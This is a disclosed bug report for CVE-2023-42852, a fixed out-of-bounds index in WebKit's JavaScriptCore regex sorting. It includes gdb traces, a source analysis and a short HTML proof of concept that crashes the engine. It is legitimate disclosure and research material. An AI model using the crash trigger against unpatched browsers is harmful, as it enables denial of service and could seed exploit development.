Originally reported in the Chromium bug tracker as [bug #1471025](https://bugs.chromium.org/p/chromium/issues/detail?id=1471025), now in the new Chromium bug tracker as [bug #40926043](https://issues.chromium.org/issues/40926043).

Chromium staff then reported to Apple on the [WebKit Bugzilla bug #260173](https://bugs.webkit.org/show_bug.cgi?id=260173).

Assigned [CVE-2023-42852](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-42852), credited to Pedro Ribeiro (`@pedrib1337`) and Vitor Pedreira (`@0xvhp_`) of Agile Information Security.

[Disclosed](https://support.apple.com/en-us/109053) [and](https://support.apple.com/en-us/109048) [credited](https://support.apple.com/en-us/109052) [in multiple](https://support.apple.com/en-us/109051) [Apple](https://support.apple.com/en-us/109049) [advisories](https://support.apple.com/en-us/109047), as well as by [WebKitGTK](https://webkitgtk.org/security/WSA-2023-0010.html).

The original bug report follows below, as well as the PoC. This issue was fixed by `commit 81ec83a` (https://commits.webkit.org/270215@main).

===

**VULNERABILITY DETAILS**   
The string below is interpreted by JavaScriptCore (JSC) as a JavaScript regular expression:  
  
```js  
/[\q{|34||78}]\*/v  
```  
  
Running this testcase with JSC under gdb results in the following backtrace:  
  
```c  
[#0] 0x369832fb3ccc → mov ebp, eax  
[#1] 0x369832f64ef2 → raise()  
[#2] 0x369832f4f472 → abort()  
[#3] 0x1eb12be13eaa → WTF::CrashOnOverflow::crash()  
[#4] 0x1eb12be13ea1 → WTF::CrashOnOverflow::overflowed()  
[#5] 0x1eb12bf1d9db → WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc>::at(this=0x7ffe9ca17bb0, i=0xffffffffffffffff)  
[#6] 0x1eb12de12d35 → WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc>::operator[](this=0x7ffe9ca17bb0, i=0xffffffffffffffff)  
[#7] 0x1eb12deb9401 → JSC::Yarr::CharacterClassConstructor::compareUTF32Strings(a=@0x7ffe9ca17bb0, b=@0x1df75c028e10)  
[#8] 0x1eb12deb9463 → JSC::Yarr::CharacterClassConstructor::sort(WTF::Vector<WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc>, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc>&)::{lambda(WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc> const&, WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc> const&)#1}::operator()(WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc> const&, WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc> const&) const(__closure=0x7ffe9ca17ba7, a=@0x7ffe9ca17bb0, b=@0x1df75c028e10)  
[#9] 0x1eb12dedbfd3 → gnu_cxx::ops::_Val_comp_iter<JSC::Yarr::CharacterClassConstructor::sort(WTF::Vector<WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc>, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc>&)::{lambda(WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc> const&, WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc> const&)#1}>::operator()<WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc>, WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc>\*>(WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc>&, WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc>\*)(this=0x7ffe9ca17ba7, val=@0x7ffe9ca17bb0, it=0x1df75c028e10)  
```  
  
Th problem occurs in the function `JSC::Yarr::CharacterClassConstructor::compareUTF32Strings()`. To understand the problem, the function `JSC::Yarr::CharacterClassConstructor::sort()` is also important.  
The crash occurs when JSC tries to sort vectors.  
  
Below is the function `JSC::Yarr::CharacterClassConstructor::sort()`:  
  
```js  
static void sort(Vector<Vector<UChar32>>& utf32Strings)  
	{         
		std::sort(utf32Strings.begin(), utf32Strings.end(), [](const Vector<UChar32>& a, const Vector<UChar32>& b)   
			{  
				return compareUTF32Strings(a, b) < 0;  
			});  
	}  
```  
  
`utf32Strings` of type `Vector<Uchar32>` is being sorted when this crash occurs.  
  
From the lambda expression in the function, we can see that this vector stores vector pointers, as confirmed under gdb:  
  
```shell  
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────  
   0x1eb12deb948b <JSC::Yarr::CharacterClassConstructor::sort(WTF::Vector<WTF::Vector<int,+0> call   0x1eb12cffa588 <_ZN3WTF6VectorINS0_IiLm0ENS_15CrashOnOverflowELm16ENS_10FastMallocEEELm0ES1_Lm16ES2_E5beginEv>  
   0x1eb12deb9490 <JSC::Yarr::CharacterClassConstructor::sort(WTF::Vector<WTF::Vector<int,+0> mov    rsi, rbx  
   0x1eb12deb9493 <JSC::Yarr::CharacterClassConstructor::sort(WTF::Vector<WTF::Vector<int,+0> mov    rdi, rax  
 → 0x1eb12deb9496 <JSC::Yarr::CharacterClassConstructor::sort(WTF::Vector<WTF::Vector<int,+0> call   0x1eb12dec0b9d <_ZSt4sortIPN3WTF6VectorIiLm0ENS0_15CrashOnOverflowELm16ENS0_10FastMallocEEEZN3JSC4Yarr25CharacterClassConstructor4sortERNS1_IS4_Lm0ES2_Lm16ES3_EEEUlRKS4_SC_E_EvT_SE_T0_>  
   ↳  0x1eb12dec0b9d <void+0>         push   rbp  
	  0x1eb12dec0b9e <void+0>         mov    rbp, rsp  
	  0x1eb12dec0ba1 <void+0>         sub    rsp, 0x20  
	  0x1eb12dec0ba5 <void+0>         mov    QWORD PTR [rbp-0x8], rdi  
	  0x1eb12dec0ba9 <void+0>         mov    QWORD PTR [rbp-0x10], rsi  
	  0x1eb12dec0bad <void+0>         call   0x1eb12dec3cc0 <_ZN9gnu_cxx5ops16__iter_comp_iterIZN3JSC4Yarr25CharacterClassConstructor4sortERN3WTF6VectorINS6_IiLm0ENS5_15CrashOnOverflowELm16ENS5_10FastMallocEEELm0ES7_Lm16ES8_EEEUlRKS9_SD_E_EENS0_15_Iter_comp_iterIT_EESG_>  
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────  
_ZSt4sortIPN3WTF6VectorIiLm0ENS0_15CrashOnOverflowELm16ENS0_10FastMallocEEEZN3JSC4Yarr25CharacterClassConstructor4sortERNS1_IS4_Lm0ES2_Lm16ES3_EEEUlRKS4_SC_E_EvT_SE_T0_ (  
   $rdi = 0x001df75c028e00,  
   $rsi = 0x001df75c028e40,  
   $rdx = 0x001df75c028e00  
)  
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:../../Source/Ja[...].cpp+435 ────  
	430      }  
	431    
	432      static void sort(Vector<Vector<UChar32>>& utf32Strings)  
	433      {  
	434          std::sort(utf32Strings.begin(), utf32Strings.end(), [](const Vector<UChar32>& a, const Vector<UChar32>& b)  
 →  435              {  
	436                  return compareUTF32Strings(a, b) < 0;  
	437              });  
	438      }  
	439    
	440      std::unique_ptr<CharacterClass> charClass()  
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────  
gef➤  x/10gx 0x001df75c028e00  
0x1df75c028e00: 0x0000000000000000      0x0000000000000000  
0x1df75c028e10: 0x00001df75c006c20      0x0000000200000002  
0x1df75c028e20: 0x0000000000000000      0x0000000000000000  
0x1df75c028e30: 0x00001df75c006c30      0x0000000200000002  
0x1df75c028e40: 0x0000000000000000  
```  
  
With the GDB output we can conclude that the memory addresses of the Vector `utf32String` starts at `0x1df75c028e00` and ends at `0x1df75c028e40`.   
  
Only 2 pointers ared stored and metadata is stored right after that, after which comes null bytes.  
  
```shell  
gef➤  x/2gx 0x00001df75c006c20  
0x1df75c006c20: 0x0000003400000033      0x0000000000000000  
gef➤  x/2gx 0x00001df75c006c30  
0x1df75c006c30: 0x0000003800000037      0x0000000000000000  
```  
  
From the above we can conclude that `uft32Strings` vector stores vector pointers to the values passed in the regular expression between the "|", as well as their metadata. In this case it will be: `NULL|34|NULL|78`.  
  
  
  
To perform the sort the size of vectors will be compared in the function `JSC::Yarr::CharacterClassConstructor::compareUTF32Strings()` in order to sort the Vector utf32Strings in descending order.  
  
```js  
static ALWAYS_INLINE int compareUTF32Strings(const Vector<UChar32>& a, const Vector<UChar32>& b)   
	{  
				//[1] Longer strings before shorter.  
		if (a.size() > b.size())   
			return -1;  
  
				//[2]  
		if (a.size() < b.size())   
			return 1;  
  
				//[3] Lexically sort for same length strings.  
		for (unsigned i = 0; i < a.size(); ++i) {  
			if (a[i] < b[i])  
				return -1;  
		}  
  
				//[4]  
		return a[a.size() - 1] > b[a.size() - 1] ? 1 : 0;   
	}  
```  
  
The problem happens when comparing the sizes of NULLs. That is, when `a.size()=0` and `b.size()=0`.  
  
The crash occurs in [4], because:  
- `a.size()` == `b.size()` so  the returns in [1] nor [2] are not triggered  
- `i` == `a.size()` == 0 so we never enter the for cycle in [3]  
- In [4], since `a.size()` == `0`, `a[-1]` is outside the vector's memory range hence it crashes with an overflow:  
  
We can see this in gdb:  
  
```shell  
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────  
   0x1eb12deb93e6 <JSC::Yarr::CharacterClassConstructor::compareUTF32Strings(WTF::Vector<int,+0> mov    rdi, rax  
   0x1eb12deb93e9 <JSC::Yarr::CharacterClassConstructor::compareUTF32Strings(WTF::Vector<int,+0> call   0x1eb12bf0d0d4 <_ZNK3WTF6VectorIiLm0ENS_15CrashOnOverflowELm16ENS_10FastMallocEE4sizeEv>  
   0x1eb12deb93ee <JSC::Yarr::CharacterClassConstructor::compareUTF32Strings(WTF::Vector<int,+0> lea    rdx, [rax-0x1] //HERE  
 → 0x1eb12deb93f2 <JSC::Yarr::CharacterClassConstructor::compareUTF32Strings(WTF::Vector<int,+0> mov    rax, QWORD PTR [rbp-0x28]  
   0x1eb12deb93f6 <JSC::Yarr::CharacterClassConstructor::compareUTF32Strings(WTF::Vector<int,+0> mov    rsi, rdx  
   0x1eb12deb93f9 <JSC::Yarr::CharacterClassConstructor::compareUTF32Strings(WTF::Vector<int,+0> mov    rdi, rax  
   0x1eb12deb93fc <JSC::Yarr::CharacterClassConstructor::compareUTF32Strings(WTF::Vector<int,+0> call   0x1eb12de12d12 <_ZNK3WTF6VectorIiLm0ENS_15CrashOnOverflowELm16ENS_10FastMallocEEixEm>  
   0x1eb12deb9401 <JSC::Yarr::CharacterClassConstructor::compareUTF32Strings(WTF::Vector<int,+0> mov    ebx, DWORD PTR [rax]  
   0x1eb12deb9403 <JSC::Yarr::CharacterClassConstructor::compareUTF32Strings(WTF::Vector<int,+0> mov    rax, QWORD PTR [rbp-0x28]  
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:../../Source/Ja[...].cpp+430 ────  
	425          for (unsigned i = 0; i < a.size(); ++i) {  
	426              if (a[i] < b[i])  
	427                  return -1;  
	428          }  
	429          return a[a.size() - 1] > b[a.size() - 1] ? 1 : 0;  
	430      }  
	431    
	432      static void sort(Vector<Vector<UChar32>>& utf32Strings)  
	433      {  
	434          std::sort(utf32Strings.begin(), utf32Strings.end(), [](const Vector<UChar32>& a, const Vector<UChar32>& b)  
	435              {  
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────  
gef➤  print $rdx  
$1 = 0xffffffffffffffff  
```  
  
**VERSION**   
Chrome on iOS (tested latest WebKit git f818e6d361ac1db886052adeb3e2f6377513a6b0 from Aug 6)  
  
**REPRODUCTION CASE**   
./WebKit/Tools/Scripts/run-minibrowser poc2.html  
  
**CREDIT INFORMATION**   
Reporter credit: Pedro Ribeiro (@pedrib1337) and Vitor Pedreira (@0xvhp_) of Agile Information Security  

`poc2.html`:
```html
<!DOCTYPE html>
<html>
<meta charset="utf-8">

<script>/[\q{|34||78}]*/v</script>

<body>
yolo
</body>

</html>
```
